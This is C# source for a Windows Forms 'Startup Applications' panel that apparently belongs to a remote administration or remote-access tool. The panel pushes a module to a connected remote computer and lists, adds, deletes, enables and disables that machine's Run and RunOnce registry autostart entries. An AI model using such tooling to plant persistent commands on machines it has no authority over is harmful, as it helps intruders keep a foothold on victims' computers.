using System.Text.Json;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms;

public sealed class StartupManagerForm : Form
{
    private const string ModuleFile = "mullvad.Module.StartupApplications";
    private const string ModuleId   = "mullvad.startupmanager";

    private readonly ClientHandler _handler;
    private ModuleContext?         _ctx;

    // ── Controls ──────────────────────────────────────────────────────────────
    private ToolStrip            toolbar        = null!;
    private ToolStripButton      btnRefresh     = null!;
    private ToolStripButton      btnAdd         = null!;
    private ToolStripButton      btnDelete      = null!;
    private ToolStripButton      btnEnable      = null!;
    private ToolStripButton      btnDisable     = null!;
    private ListView             lvStartup      = null!;
    private StatusStrip          statusStrip    = null!;
    private ToolStripStatusLabel statusLabel    = null!;
    private ToolStripProgressBar statusProgress = null!;
    private Panel                loadingPanel   = null!;
    private Label                loadingLabel   = null!;

    private static readonly Dictionary<ClientHandler, StartupManagerForm> _openForms = new();

    public static StartupManagerForm CreateOrActivate(ClientHandler handler)
    {
        if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
        {
            existing.BringToFront();
            return existing;
        }
        var frm = new StartupManagerForm(handler);
        frm.FormClosed += (_, _) => _openForms.Remove(handler);
        _openForms[handler] = frm;
        return frm;
    }

    private StartupManagerForm(ClientHandler handler)
    {
        _handler = handler;
        Build();
    }

    // ── Build ─────────────────────────────────────────────────────────────────

    private void Build()
    {
        SuspendLayout();

        Text          = $"Startup Applications — {_handler.Info.Computer}";
        Size          = new Size(1000, 560);
        MinimumSize   = new Size(700, 400);
        StartPosition = FormStartPosition.CenterScreen;
        Font          = new Font("Segoe UI", 9F);
        KeyPreview    = true;

        var iconBmp = IconLoader.Load("application_edit.png") as Bitmap;
        if (iconBmp is not null) try { Icon = Icon.FromHandle(iconBmp.GetHicon()); } catch { }
        else Icon = SystemIcons.Application;

        // ── Toolbar ──────────────────────────────────────────────────────────
        toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Padding = new Padding(2) };

        btnRefresh = AddToolBtn("Refresh", "refresh.png",  "Refresh list (F5)");
        btnAdd     = AddToolBtn("Add",     "add.png",      "Add startup entry");
        btnDelete  = AddToolBtn("Delete",  "delete.png",   "Delete selected entry");
        btnEnable  = AddToolBtn("Enable",  "accept.png",   "Enable selected entry");
        btnDisable = AddToolBtn("Disable", "exclamation.png", "Disable selected entry");

        btnRefresh.Click += (_, _) => _ = RefreshAsync();
        btnAdd.Click     += (_, _) => ShowAddDialog();
        btnDelete.Click  += BtnDelete_Click;
        btnEnable.Click  += (_, _) => ToggleEnabled(true);
        btnDisable.Click += (_, _) => ToggleEnabled(false);

        toolbar.Items.AddRange(new ToolStripItem[]
        {
            btnRefresh, new ToolStripSeparator(),
            btnAdd, btnDelete, new ToolStripSeparator(),
            btnEnable, btnDisable,
        });

        // ── ListView ─────────────────────────────────────────────────────────
        lvStartup = new ListView
        {
            Dock          = DockStyle.Fill,
            View          = View.Details,
            FullRowSelect = true,
            HideSelection = false,
            GridLines     = false,
            AllowDrop     = true,
            MultiSelect   = false,
        };
        lvStartup.Columns.Add("Name",     200);
        lvStartup.Columns.Add("Command",  350);
        lvStartup.Columns.Add("Location", 140);
        lvStartup.Columns.Add("Type",     90);
        lvStartup.Columns.Add("Status",   80);

        // Context menu
        var ctxMenu   = new ContextMenuStrip();
        var mnuAdd    = new ToolStripMenuItem("Add Application…")  { Image = IconLoader.Load("add.png") };
        var mnuDel    = new ToolStripMenuItem("Delete")            { Image = IconLoader.Load("delete.png") };
        var mnuEnable = new ToolStripMenuItem("Enable")            { Image = IconLoader.Load("accept.png") };
        var mnuDisab  = new ToolStripMenuItem("Disable")           { Image = IconLoader.Load("exclamation.png") };
        var mnuRef    = new ToolStripMenuItem("Refresh")           { Image = IconLoader.Load("refresh.png") };
        mnuAdd.Click    += (_, _) => ShowAddDialog();
        mnuDel.Click    += BtnDelete_Click;
        mnuEnable.Click += (_, _) => ToggleEnabled(true);
        mnuDisab.Click  += (_, _) => ToggleEnabled(false);
        mnuRef.Click    += (_, _) => _ = RefreshAsync();
        ctxMenu.Items.AddRange(new ToolStripItem[] { mnuAdd, new ToolStripSeparator(), mnuDel, new ToolStripSeparator(), mnuEnable, mnuDisab, new ToolStripSeparator(), mnuRef });
        lvStartup.ContextMenuStrip = ctxMenu;

        // Drag-drop
        lvStartup.DragEnter += LvStartup_DragEnter;
        lvStartup.DragDrop  += LvStartup_DragDrop;

        // ── Status strip ──────────────────────────────────────────────────────
        statusStrip    = new StatusStrip();
        statusLabel    = new ToolStripStatusLabel("Ready") { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
        statusProgress = new ToolStripProgressBar { Visible = false, Width = 120 };
        statusStrip.Items.AddRange(new ToolStripItem[] { statusLabel, statusProgress });

        // ── Loading overlay ───────────────────────────────────────────────────
        loadingPanel = new Panel { Dock = DockStyle.Fill, Visible = true };
        loadingLabel = new Label
        {
            Text      = "Loading startup manager…",
            AutoSize  = false,
            TextAlign = ContentAlignment.MiddleCenter,
            Dock      = DockStyle.Fill,
            Font      = new Font("Segoe UI", 12F),
        };
        loadingPanel.Controls.Add(loadingLabel);

        Controls.Add(loadingPanel);
        Controls.Add(lvStartup);
        Controls.Add(toolbar);
        Controls.Add(statusStrip);

        ResumeLayout();
    }

    private ToolStripButton AddToolBtn(string text, string icon, string tip)
    {
        var btn = new ToolStripButton(text) { ToolTipText = tip };
        var img = IconLoader.Load(icon);
        if (img is not null) { btn.Image = img; btn.DisplayStyle = ToolStripItemDisplayStyle.Image; }
        else btn.DisplayStyle = ToolStripItemDisplayStyle.Text;
        return btn;
    }

    // ── OnLoad ────────────────────────────────────────────────────────────────

    protected override async void OnLoad(EventArgs e)
    {
        base.OnLoad(e);
        SetBusy(true, "Delivering module…");
        _handler.Disconnected += OnClientDisconnected;
        try
        {
            var moduleBytes = ModuleLoader.GetModuleBytes(ModuleFile);
            if (moduleBytes is null) { SetStatus("Module file not found — build the StartupApplications project first"); loadingPanel.Visible = false; return; }

            using var deliveryCts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
            bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, moduleBytes, null, deliveryCts.Token);
            if (!ok) { SetStatus("Module delivery failed"); loadingPanel.Visible = false; return; }

            _ctx = new ModuleContext(_handler, ModuleId);
            _ctx.Disconnected += (_, _) => BeginInvoke(() => OnClientDisconnected(_handler));

            loadingPanel.Visible = false;
            SetBusy(false);

            await RefreshAsync();
        }
        catch (Exception ex)
        {
            SetStatus("Error: " + ex.Message);
            loadingPanel.Visible = false;
            SetBusy(false);
        }
    }

    protected override void OnFormClosed(FormClosedEventArgs e)
    {
        _handler.Disconnected -= OnClientDisconnected;
        _ctx?.Dispose();
        base.OnFormClosed(e);
    }

    private void OnClientDisconnected(ClientHandler _)
    {
        if (IsDisposed) return;
        BeginInvoke(() => { if (!IsDisposed) Close(); });
    }

    // ── Refresh ───────────────────────────────────────────────────────────────

    private async Task RefreshAsync()
    {
        if (_ctx is null) return;
        SetBusy(true, "Fetching startup entries…");

        string? json = null;
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
            json = await _ctx.ExecuteAsync("list", "", cts.Token);
        }
        catch { }

        if (IsDisposed) return;
        BeginInvoke(() =>
        {
            lvStartup.BeginUpdate();
            lvStartup.Items.Clear();

            if (json != null && !json.StartsWith("{\"error\""))
            {
                var entries = ParseEntries(json);
                foreach (var e in entries)
                {
                    var lvi = new ListViewItem(e.Name);
                    lvi.SubItems.Add(e.Command);
                    lvi.SubItems.Add(e.Location);
                    lvi.SubItems.Add(e.Type);
                    lvi.SubItems.Add(e.Status);
                    lvi.ForeColor = e.Status == "Disabled" ? SystemColors.GrayText : lvStartup.ForeColor;
                    lvi.Tag       = e;
                    lvStartup.Items.Add(lvi);
                }
            }
            else if (json != null)
            {
                SetStatus("Error: " + json);
            }

            lvStartup.EndUpdate();
            SetBusy(false);
            SetStatus($"{lvStartup.Items.Count} startup entries");
        });
    }

    // ── Add ───────────────────────────────────────────────────────────────────

    private void ShowAddDialog(string? prefillCommand = null)
    {
        using var dlg = new Form();
        dlg.Text        = "Add Startup Entry";
        dlg.Size        = new Size(520, 210);
        dlg.FormBorderStyle = FormBorderStyle.FixedDialog;
        dlg.MaximizeBox = false;
        dlg.MinimizeBox = false;
        dlg.StartPosition = FormStartPosition.CenterParent;
        dlg.Font        = Font;

        var lblName = new Label { Text = "Name:",    Left = 10, Top = 14, Width = 80, AutoSize = false, Height = 20, TextAlign = ContentAlignment.MiddleRight };
        var tbName  = new TextBox { Left = 96, Top = 12, Width = 400 };
        var lblCmd  = new Label { Text = "Command:", Left = 10, Top = 46, Width = 80, AutoSize = false, Height = 20, TextAlign = ContentAlignment.MiddleRight };
        var tbCmd   = new TextBox { Left = 96, Top = 44, Width = 318, Text = prefillCommand ?? "" };
        var btnBrowse = new Button { Text = "…", Left = 418, Top = 43, Width = 78, Height = 24 };
        var lblLoc  = new Label { Text = "Location:", Left = 10, Top = 78, Width = 80, AutoSize = false, Height = 20, TextAlign = ContentAlignment.MiddleRight };
        var cbLoc   = new ComboBox
        {
            Left = 96, Top = 76, Width = 200, DropDownStyle = ComboBoxStyle.DropDownList
        };
        cbLoc.Items.AddRange(new object[] { "HKCU\\Run", "HKLM\\Run", "HKCU\\RunOnce", "HKLM\\RunOnce" });
        cbLoc.SelectedIndex = 0;

        var ok  = new Button { Text = "OK",     DialogResult = DialogResult.OK,     Left = 318, Top = 118, Width = 88, Height = 28 };
        var can = new Button { Text = "Cancel", DialogResult = DialogResult.Cancel, Left = 416, Top = 118, Width = 88, Height = 28 };
        dlg.AcceptButton = ok;
        dlg.CancelButton = can;

        // If name is empty and command is pre-filled, derive name from filename
        if (!string.IsNullOrEmpty(prefillCommand) && tbName.Text.Length == 0)
            tbName.Text = System.IO.Path.GetFileNameWithoutExtension(prefillCommand);

        btnBrowse.Click += (_, _) =>
        {
            using var ofd = new OpenFileDialog { Filter = "Executables|*.exe;*.bat;*.cmd;*.ps1|All files|*.*", Title = "Select file" };
            if (ofd.ShowDialog(dlg) == DialogResult.OK)
            {
                tbCmd.Text = $"\"{ofd.FileName}\"";
                if (string.IsNullOrEmpty(tbName.Text))
                    tbName.Text = System.IO.Path.GetFileNameWithoutExtension(ofd.FileName);
            }
        };

        dlg.Controls.AddRange(new Control[] { lblName, tbName, lblCmd, tbCmd, btnBrowse, lblLoc, cbLoc, ok, can });
        if (dlg.ShowDialog(this) != DialogResult.OK) return;

        var name     = tbName.Text.Trim();
        var command  = tbCmd.Text.Trim();
        var location = cbLoc.Text;

        if (string.IsNullOrEmpty(name))    { MessageBox.Show("Name cannot be empty.");    return; }
        if (string.IsNullOrEmpty(command)) { MessageBox.Show("Command cannot be empty."); return; }

        _ = AddEntryAsync(name, command, location);
    }

    private async Task AddEntryAsync(string name, string command, string location)
    {
        if (_ctx is null) return;
        SetBusy(true, "Adding entry…");
        try
        {
            var payload  = $"{{\"name\":{JsonStr(name)},\"command\":{JsonStr(command)},\"location\":{JsonStr(location)}}}";
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(20));
            var json = await _ctx.ExecuteAsync("add", payload, cts.Token);
            if (IsDisposed) return;
            BeginInvoke(() =>
            {
                SetBusy(false);
                if (json?.Contains("\"success\"") == true) { SetStatus($"Added: {name}"); _ = RefreshAsync(); }
                else SetStatus("Add failed: " + json);
            });
        }
        catch (Exception ex) { if (!IsDisposed) BeginInvoke(() => { SetBusy(false); SetStatus("Error: " + ex.Message); }); }
    }

    // ── Delete ────────────────────────────────────────────────────────────────

    private void BtnDelete_Click(object? sender, EventArgs e)
    {
        if (lvStartup.SelectedItems.Count == 0) return;
        var item  = lvStartup.SelectedItems[0];
        var entry = item.Tag as StartupEntry;
        if (entry is null) return;

        if (MessageBox.Show(this,
            $"Remove '{entry.Name}' from startup?\n\nCommand: {entry.Command}", "Confirm Delete",
            MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes)
            return;

        _ = DeleteEntryAsync(entry);
    }

    private async Task DeleteEntryAsync(StartupEntry entry)
    {
        if (_ctx is null) return;
        SetBusy(true, "Deleting entry…");
        try
        {
            var payload  = $"{{\"name\":{JsonStr(entry.Name)},\"location\":{JsonStr(entry.Location)}}}";
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(20));
            var json = await _ctx.ExecuteAsync("delete", payload, cts.Token);
            if (IsDisposed) return;
            BeginInvoke(() =>
            {
                SetBusy(false);
                if (json?.Contains("\"success\"") == true) { SetStatus($"Deleted: {entry.Name}"); _ = RefreshAsync(); }
                else SetStatus("Delete failed: " + json);
            });
        }
        catch (Exception ex) { if (!IsDisposed) BeginInvoke(() => { SetBusy(false); SetStatus("Error: " + ex.Message); }); }
    }

    // ── Enable / Disable ──────────────────────────────────────────────────────

    private void ToggleEnabled(bool enable)
    {
        if (lvStartup.SelectedItems.Count == 0) return;
        var entry = lvStartup.SelectedItems[0].Tag as StartupEntry;
        if (entry is null) return;
        _ = SetEnabledAsync(entry, enable);
    }

    private async Task SetEnabledAsync(StartupEntry entry, bool enable)
    {
        if (_ctx is null) return;
        SetBusy(true, enable ? "Enabling…" : "Disabling…");
        try
        {
            var payload  = $"{{\"name\":{JsonStr(entry.Name)},\"location\":{JsonStr(entry.Location)}}}";
            var action   = enable ? "enable" : "disable";
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(20));
            var json = await _ctx.ExecuteAsync(action, payload, cts.Token);
            if (IsDisposed) return;
            BeginInvoke(() =>
            {
                SetBusy(false);
                if (json?.Contains("\"success\"") == true) { SetStatus($"{(enable ? "Enabled" : "Disabled")}: {entry.Name}"); _ = RefreshAsync(); }
                else SetStatus($"{action} failed: " + json);
            });
        }
        catch (Exception ex) { if (!IsDisposed) BeginInvoke(() => { SetBusy(false); SetStatus("Error: " + ex.Message); }); }
    }

    // ── Drag-drop ─────────────────────────────────────────────────────────────

    private void LvStartup_DragEnter(object? sender, DragEventArgs e)
    {
        if (e.Data?.GetDataPresent(DataFormats.FileDrop) == true)
            e.Effect = DragDropEffects.Copy;
        else
            e.Effect = DragDropEffects.None;
    }

    private void LvStartup_DragDrop(object? sender, DragEventArgs e)
    {
        var files = e.Data?.GetData(DataFormats.FileDrop) as string[];
        if (files is null || files.Length == 0) return;

        foreach (var file in files)
        {
            var ext = System.IO.Path.GetExtension(file).ToLowerInvariant();
            if (ext == ".exe" || ext == ".bat" || ext == ".cmd" || ext == ".ps1" || ext == ".lnk")
                ShowAddDialog(file);
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private void SetBusy(bool busy, string? msg = null)
    {
        statusProgress.Visible = busy;
        if (msg is not null) statusLabel.Text = msg;
    }

    private void SetStatus(string msg) => statusLabel.Text = msg;

    private static string JsonStr(string s)
    {
        if (s == null) return "\"\"";
        var sb = new System.Text.StringBuilder("\"");
        foreach (char c in s)
        {
            switch (c)
            {
                case '\\': sb.Append("\\\\"); break;
                case '"':  sb.Append("\\\""); break;
                case '\r': sb.Append("\\r");  break;
                case '\n': sb.Append("\\n");  break;
                case '\t': sb.Append("\\t");  break;
                default:
                    if (c < 0x20) sb.Append("\\u").Append(((int)c).ToString("X4"));
                    else          sb.Append(c);
                    break;
            }
        }
        sb.Append('"');
        return sb.ToString();
    }

    private sealed class StartupEntry
    {
        public string Name     = "";
        public string Command  = "";
        public string Location = "";
        public string Type     = "";
        public string Status   = "";
    }

    private static List<StartupEntry> ParseEntries(string json)
    {
        var result = new List<StartupEntry>();
        try
        {
            using var doc = JsonDocument.Parse(json);
            if (doc.RootElement.ValueKind != JsonValueKind.Array) return result;
            foreach (var el in doc.RootElement.EnumerateArray())
            {
                var e = new StartupEntry
                {
                    Name     = el.TryGetProperty("name",     out var n) ? n.GetString() ?? "" : "",
                    Command  = el.TryGetProperty("command",  out var c) ? c.GetString() ?? "" : "",
                    Location = el.TryGetProperty("location", out var l) ? l.GetString() ?? "" : "",
                    Type     = el.TryGetProperty("type",     out var t) ? t.GetString() ?? "" : "",
                    Status   = el.TryGetProperty("status",   out var s) ? s.GetString() ?? "" : "",
                };
                result.Add(e);
            }
        }
        catch { }
        return result;
    }

    protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
    {
        if (keyData == Keys.F5) { _ = RefreshAsync(); return true; }
        return base.ProcessCmdKey(ref msg, keyData);
    }
}
